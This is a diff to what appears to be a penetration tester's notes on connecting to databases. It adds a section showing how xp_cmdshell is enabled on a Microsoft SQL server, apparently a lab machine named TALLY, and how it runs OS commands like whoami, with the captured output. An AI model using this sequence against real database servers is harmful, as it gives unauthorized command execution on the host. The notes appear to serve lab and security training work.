@@ -2,10 +2,15 @@ Databases
 ---------
 
 #Connect to database GUI in Linux
-hexorbase
+hexorbase (no good)
+DBeaver (uptodate good)
+
+
 
 #Connect to Microsoft SQL database
 /usr/bin/mssqlclient.py -p 1433 admin:m\@x.x.x.x
+
+
 
 #Connect to Microsoft SQL database
 tsql -S x.x.x.x -p 1337 -U admin
@@ -29,4 +34,46 @@ password
 
 1> SELECT * FROM tablename_whats_inside
 2> go
+
+
+#Enable shell
+1> EXEC sp_configure 'show advanced options', 1;
+2> go
+Msg 15457 (severity 0, state 1) from TALLY, Procedure sp_configure Line 185:
+	"Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install."
+(return status = 0)
+
+1> RECONFIGURE;
+2> go
+
+1> EXEC sp_configure 'xp_cmdshell', 1;
+2> go
+Msg 15457 (severity 0, state 1) from TALLY, Procedure sp_configure Line 185:
+	"Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install."
+(return status = 0)
+
+1> RECONFIGURE;
+2> go
+
+2> exec xp_cmdshell 'whoami';
+3> go
+output
+tally\sarah
+NULL
+(2 rows affected)
+(return status = 0)
+output
+tally\sarah
+NULL
+(2 rows affected)
+(return status = 0)
+1> 
+
+1> exec xp_cmdshell 'echo %CD%';
+2> go
+output
+C:\Windows\system32
+NULL
+(2 rows affected)
+(return status = 0)
 
